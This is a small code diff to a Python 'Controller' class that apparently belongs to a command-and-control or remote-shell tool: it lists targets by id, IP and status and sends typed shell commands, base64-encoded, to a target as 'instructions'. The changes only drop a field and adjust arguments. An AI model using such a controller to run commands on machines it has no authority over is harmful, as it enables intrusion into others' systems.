@@ -28,7 +28,6 @@ class Controller(Host):
         for target in targets:
             response += f"[*] {target['id']}\n"
             response += f" --> {target['ip']}\n"
-            response += f" --> {target['iface']}\n"
             response += f" --> {target['status']}\n"
         
         return response
@@ -45,7 +44,7 @@ class Controller(Host):
 
         while True:
             cmd = input("shell: ").encode()
-            self.send(target['ip'], "instruction", "request", base64.b64encode(cmd))
+            self.send(target['ip'], "instruction", base64.b64encode(cmd))
         # print(f"Instruction Response:\n{base64.b64decode(shellpack['data'].decode()).decode()}")
 
     def instruction(self, shellpack):
